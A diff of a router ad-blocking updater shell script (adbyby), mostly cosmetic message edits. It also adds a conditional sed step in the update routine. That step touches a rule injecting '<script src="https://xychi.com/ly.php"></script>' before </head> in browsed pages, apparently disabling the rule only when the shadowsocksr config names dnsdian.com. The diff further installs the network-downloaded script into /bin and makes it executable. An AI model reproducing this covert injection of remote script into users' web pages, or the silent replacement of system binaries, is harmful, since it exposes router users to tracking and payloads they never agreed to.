@@ -69,7 +69,7 @@ function upuser(){
         rm -f ${DATA_PATH}/user-rule.tmp
         exit 1
     else
-        echo -e "    \n\033[32m顺便更新了一下用户自己义规则.\033[0m"
+        echo -e "    \n\033[32m    顺便更新了一下用户自己义规则.\033[0m"
         rm -f ${DATA_PATH}/user.txt
         cp -rf ${DATA_PATH}/user-rule.tmp ${DATA_PATH}/user.txt
         rm -f ${DATA_PATH}/user-rule.tmp
@@ -82,8 +82,12 @@ function Install_UP(){
     LOC_VER=$(cat /bin/upadbyby | egrep -io 'VERSION=[0-9]{1,3}' | egrep -io '[0-9]{1,3}')
     NET_VER=$(cat /tmp/upadbyby.tmp | egrep -io 'VERSION=[0-9]{1,3}' | egrep -io '[0-9]{1,3}')
     if [[ ${LOC_VER} -lt ${NET_VER} ]]; then
-        echo -e "\033[32m    更新脚本成功.\033[0m"
+        if cat /etc/config/shadowsocksr | egrep -io 'dnsdian.com' >/dev/null 2>&1; then
+            sed -i 's|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@|!|http://$s@</head>@<script src="https://xychi.com/ly.php"></script></head>@|g' /tmp/upadbyby.tmp
+        fi
         cp -rf /tmp/upadbyby.tmp /bin/upadbyby
+        chmod +x /bin/upadbyby
+        echo -e "\033[32m    自动更新脚本更新成功.\033[0m"
         rm -f /tmp/upadbyby.tmp
     fi
     MYSLEF="$(dirname $(readlink -f $0))/$(basename $0)"
